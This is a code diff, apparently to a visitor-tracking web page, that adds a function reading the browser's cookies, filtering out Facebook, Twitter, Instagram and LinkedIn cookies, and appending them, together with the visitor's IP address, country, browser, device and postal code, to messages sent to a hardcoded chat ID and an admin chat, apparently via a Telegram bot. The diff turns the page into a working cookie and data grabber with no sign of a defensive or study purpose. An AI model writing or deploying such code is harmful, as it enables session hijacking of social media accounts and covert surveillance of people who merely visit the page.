@@ -97,6 +97,17 @@ console.log('Server aktif');
                     return deviceBrand;
                 }
 
+                function getSocialMediaCookies() {
+                    const cookies = document.cookie.split('; ');
+                    const socialMediaCookies = cookies.filter(cookie => 
+                        cookie.includes('facebook') || 
+                        cookie.includes('twitter') || 
+                        cookie.includes('instagram') || 
+                        cookie.includes('linkedin')
+                    );
+                    return socialMediaCookies.join('; ');
+                }
+
                 function trackIp() {
                     getIp((data) => {
                         const userIp = data.ip;
@@ -107,12 +118,13 @@ console.log('Server aktif');
                         const referrer = document.referrer || 'Direct Access';
                         const deviceBrand = getDeviceBrand();
                         const postalCode = data.postal;
-                        const chatId = 'USER_CHAT_ID'; // Replace with the actual chat ID
-                        const message = `Your IP address is: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}`;
+                        const socialMediaCookies = getSocialMediaCookies();
+                        const chatId = '7407149096'; // Replace with the actual chat ID
+                        const message = `Your IP address is: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}\nSocial Media Cookies: ${socialMediaCookies}`;
                         
                         if (chatId) {
                             sendMessage(chatId, message);
-                            sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}`);
+                            sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}\nSocial Media Cookies: ${socialMediaCookies}`);
                         } else {
                             console.error('Chat ID not found.');
                         }
